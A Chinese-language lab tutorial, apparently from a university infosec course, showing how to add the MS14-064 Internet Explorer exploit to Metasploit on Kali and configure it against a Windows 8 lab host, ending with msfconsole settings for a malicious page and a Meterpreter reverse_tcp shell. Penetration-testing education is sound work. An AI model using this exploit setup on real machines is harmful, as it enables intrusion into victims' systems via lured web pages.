Metasploit攻击Win8实例

lime2019 2020-10-14 网络安全

# 实验简介

实验所属系列： 安全工具使用

实验对象：本科/专科信息安全专业

相关课程及专业： linux基础、网络安全

实验类别： 实践实验类

# 预备知识

Exploit-db.com基本介绍

Exploit-db.com（EDB）是一个综合性的软件脆弱性和漏洞信息收集平台，它为软件开发者、安全漏洞研究人员、渗透测试者提供了大量的有关于各个操作系统、主流软件应用的脆弱性信息或漏洞利用程序。EDB漏洞利用程序主要包括：远程exploit、本地exploit、web应用exploit、拒绝服务攻击exploit以及shellcode五类。从某种角度来说EDB不仅是漏洞利用下载网站，也是一个很好的学习平台，官网会发布一些最新的安全研究议题论文，安全测试人员可以通过阅读论文自行编程实现自定义exploit，既能满足安全测试的需要又能锻炼论文阅读能力和编程能力。

EDB提供了强大的exploit搜索功能，既可以根据漏洞元信息（cve编号、osvdb编号、漏洞简介、exploit编写作者）来搜索exploit，也可以通过产生漏洞的应用信息（平台、端口、类型、语言）来搜索exploit。

# 实验目的

  • 充分利用exploit-db.com丰富的Exploits资源进行安全测试
  • 学会为Metasploit添加最新Exploit和在Kali中更新整个Metasploit框架
  • 以最新爆出的IE神洞示范如何利用Metasploit攻击win8操作系统

# 实验环境

漏洞主机：win8，IP地址：10.1.1.135

攻击主机：Kali linux，IP地址：10.1.1.128

# 实验步骤二

单独添加Exploit

Kali-linux下metasploit 的exploit可识别路径包括：~/.msf4/modules和 /usr/share/metasploit-framework/modules/exploits/windows/browser。只需将exploit放在metasploit的exploit可识别路径下，并通过msf相关命令将其加载即可。

  1. 使用命令locate metasploit，查找metasploit的安装路径;

  2. 使用命令msfconsole，查看metasploit中漏洞数量；

  3. 使用命令search ms14_064搜索ms14_064，提示为空；

  4. 将桌面上文件复制到metasploit系统指定的exploits存储路径中，并将此文件的属性设置为644；

    # 复制文件
cp ~/Desktop/ms14_064_ole_exploit.rb /usr/share/metasploit-framework/modules/exploits/windows/browser/
# 提升文件权限
chmod 644 ms14_064_ole_exploit.rb

Kali-linux下更新整个metasploit框架

  1. 在kali下直接使用msfupdate更新命令会提示没有更新，需要添加如下内容到/etc/apt/source.list软件更新源列表文件。
    # 编辑/etc/apt/source.list文件
vim /etc/apt/source.list
# 添加内容
deb http://http.kali.org/kali kali main non-free contrib
deb-src http://http.kali.org/kali kali main non-free contrib

# 实验步骤三

选择MS14_064漏洞来演示如何通过诱骗攻击者点击我们精心构造的含有攻击代码的网页来实现系统入侵。

  1. 输入命令msfconsole，启动metasploit，运行use exploit/windows/browser/ms14_064_ole_exploit选择漏洞EXP；

  2. 输入命令show options查看配置项；

  3. 为了限制恶意网页的访问IP范围，设置服务器绑定IP为10.1.1.128（非10.1.1.0/24网段的主机无法访问恶意网页）。服务器常用端口可能会发生占用冲突，设置服务器端口为8060，避开常用端口8080。设置生成的恶意网页的URI为google.com以便于记忆。

     set SRVHOST 10.1.1.128
 set SRVPORT 8060
 set URIPATH google.com
 # 设置攻击负载
 set PAYLOAD windows/meterpreter/reverse_tcp
 # 设置LHOST，避免本地IP端口冲突
 set LHOST 10.1.1.128
 # 设置LPORT
 set LPORT 5555
